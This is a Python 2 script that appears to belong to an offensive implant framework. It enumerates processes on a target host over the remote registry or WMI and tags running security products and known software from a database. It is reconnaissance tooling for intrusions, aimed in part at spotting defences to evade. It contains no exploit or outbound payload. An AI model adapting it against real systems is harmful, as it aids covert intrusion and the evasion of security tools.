
from __future__ import print_function
from __future__ import division
import codecs
import datetime
import ntpath
import optparse
import os
import re
import sqlite3
import sys
import traceback
import dsz, dsz.lp
import ops, ops.cmd
import util.ip
from ops.pprint import pprint
from util.DSZPyLogger import DSZPyLogger
utf8_decoder = codecs.getdecoder('utf8')

def utf8_to_unicode(s):
    return (utf8_decoder(s)[0] if (type(s) is not unicode) else s)
LOGFILE = 'remoteprocesslist.py'
ELIST = sqlite3.connect(os.path.join(dsz.lp.GetResourcesDirectory(), 'Ops', 'Databases', 'SimpleProcesses.db'))

def pulist(ip, dszquiet=False):
    flags = dsz.control.Method()
    if dszquiet:
        dsz.control.quiet.On()
    dsz.control.echo.Off()
    cmd = ops.cmd.getDszCommand('performance', dszuser=ops.cmd.CURRENT_USER, data='Process', bare=True, target=(ip if (ip != '127.0.0.1') else None))
    ops.info(("Running '%s'..." % cmd))
    result = cmd.execute()
    if (not cmd.success):
        if (result.commandmetadata.status == 268435456):
            ops.error(('Open of registry failed.\n\tThis could be because access is denied or the network path was not found.\n\tCheck your logs for command ID %d for more information.' % result.cmdid))
            del flags
            return None
        elif (result.commandmetadata.status is None):
            dszlogger = DSZPyLogger()
            log = dszlogger.getLogger(LOGFILE)
            log.error('Command did not execute, possibly the result of a malformed command line.')
            ops.info('A problem report has been automatically generated for this issue.', type=dsz.DEFAULT)
        else:
            ops.error(('Failed to query performance hive. Check your logs for command ID %d for more information.' % result.cmdid))
            del flags
            return None
    if (not result.performance.object):
        ops.error(('Query succeeded but returned no data. Check your logs for command ID %d and hope for enlightenment.' % result.cmdid))
    regex = re.compile('.+\\....$')
    table = []
    echo = []
    uptime = None
    for instance in result.performance.object[0].instance:
        if (regex.match(instance.name) is None):
            proc = (instance.name + '.exe')
        else:
            proc = instance.name
        for c in instance.counter:
            if (c.name == '784'):
                pid = int(c.value)
            elif (c.name == '1410'):
                ppid = int(c.value)
            elif (c.name == '684'):
                runtime = datetime.timedelta(microseconds=((result.performance.perfTime100nSec - int(c.value)) // 10))
        if (((pid == 0) and (ppid == 0) and (instance.name == 'Idle')) or (((pid == 4) or (pid == 8)) and (instance.name == 'System'))):
            [code, comment] = [dsz.DEFAULT, ('System Idle Counter' if (instance.name == 'Idle') else 'System Kernel')]
        elif ((pid == 0) and (ppid == 0) and (instance.name == '_Total') and (runtime == datetime.timedelta(microseconds=0))):
            continue
        else:
            [code, comment] = check_process(proc)
        table.append({'Process': instance.name, 'PID': pid, 'PPID': ppid, 'Comment': comment, 'Elapsed Time': runtime})
        echo.append(code)
    pprint(table, dictorder=['PID', 'PPID', 'Elapsed Time', 'Process', 'Comment'], echocodes=echo)
    del flags
    return result

def emkg_plist(ip, dszquiet=False):
    flags = dsz.control.Method()
    if dszquiet:
        dsz.control.quiet.On()
    dsz.control.echo.Off()
    cmd = ops.cmd.getDszCommand('processes', dszuser=ops.cmd.CURRENT_USER, list=True, target=(ip if (ip != '127.0.0.1') else None))
    ops.info(("Running '%s'..." % cmd))
    result = cmd.execute()
    if (not cmd.success):
        if (result.commandmetadata.status == 268435456):
            ops.error(('Open of registry failed.\n\tThis could be because access is denied or the network path was not found.\n\tCheck your logs for command ID %d for more information.' % result.cmdid))
            del flags
            return None
        elif (result.commandmetadata.status is None):
            dszlogger = DSZPyLogger()
            log = dszlogger.getLogger(LOGFILE)
            log.error('Command did not execute, possibly the result of a malformed command line.')
            ops.info('A problem report has been automatically generated for this issue.', type=dsz.DEFAULT)
        else:
            ops.error(('Failed to query performance hive. Check your logs for command ID %d for more information.' % result.cmdid))
            del flags
            return None
    table = []
    echo = []
    for processitem in result.initialprocesslistitem.processitem:
        if ((processitem.id == 0) and (processitem.parentid == 0)):
            name = 'System Idle Process'
        else:
            name = processitem.name
        [code, comment] = check_process(name)
        table.append({'Path': processitem.path, 'Process': name, 'PID': processitem.id, 'PPID': processitem.parentid, 'Created': ('' if ((processitem.name == 'System') or (processitem.name == 'System Idle Process')) else ('%s %s %s' % (processitem.created.date, processitem.created.time, processitem.created.type.upper()))), 'Comment': comment, 'User': processitem.user})
        echo.append(code)
    if ((ip is None) or (ip == '127.0.0.1')):
        pprint(table, dictorder=['PID', 'PPID', 'Created', 'Path', 'Process', 'User', 'Comment'], echocodes=echo)
    else:
        pprint(table, dictorder=['PID', 'PPID', 'Created', 'Path', 'Process', 'Comment'], echocodes=echo)
    del flags
    return result

def check_process(proc):
    uproc = utf8_to_unicode(proc)
    row = ELIST.cursor().execute('SELECT type, comment FROM ProcessInformation WHERE name LIKE ?', [uproc]).fetchall()
    if (len(row) == 0):
        return (dsz.WARNING, '')
    else:
        code = dsz.DEFAULT
        if (row[0][0] == 'MALICIOUS_SOFTWARE'):
            code = dsz.ERROR
        elif (row[0][0] == 'SECURITY_PRODUCT'):
            code = dsz.WARNING
        elif (row[0][0] == 'SAFE'):
            code = dsz.GOOD
        return [code, row[0][1]]
if (__name__ == '__main__'):
    dszquiet = False
    if (dsz.script.Env['script_parent_echo_disabled'].lower() != 'false'):
        dszquiet = True
    parser = optparse.OptionParser()
    parser.add_option('-t', '--target', dest='target', default=None, help='IP address of target to query. If none specified, then commands are done in the current context.')
    parser.add_option('-e', '--wmi', '--emptykeg', dest='wmi', default=False, action='store_true', help='Remote: Use WMI (EMPTYKEG) method to query process information. Current: uses normal process listing API.')
    parser.add_option('-p', '--reg', '--pulist', dest='reg', default=False, action='store_true', help='Remote: Use the remote registry (pulist) method to query process information via the performance hive. Current: Directly queries the performahce hive.')
    (options, args) = parser.parse_args()
    if args:
        parser.print_help()
        parser.error('Not all arguments consumed by the beast.')
    if (not (options.wmi ^ options.reg)):
        parser.print_help()
        parser.error('One of --wmi or --reg must be specified so I know what to do.')
    if (options.target is None):
        if (not dsz.ui.Prompt('No target provided. Did you really mean to run this against localhost?', False)):
            sys.exit((-1))
    if ((options.target is not None) and options.target.startswith('\\\\')):
        options.target = options.target[2:]
        ops.info(("A \\\\ is not required. I assume you mean '%s' as your target IP." % options.target))
    if ((options.target is not None) and (not util.ip.validate(options.target))):
        ops.error(("Your target '%s' does not appear to be a proper IP address. Try again." % options.target))
        sys.exit((-1))
    if options.wmi:
        func = emkg_plist
    elif options.reg:
        func = pulist
    else:
        raise RuntimeError, "How'd you get here? You get a prize!"
    try:
        ret = func(options.target, dszquiet)
    except Exception as e:
        dszlogger = DSZPyLogger()
        log = dszlogger.getLogger(LOGFILE)
        log.error(traceback.format_exc())
        ops.info('Unexpected things happened. A problem report has been automatically generated for this issue.', type=dsz.DEFAULT)
        ret = False
    if (not ret):
        sys.exit((-1))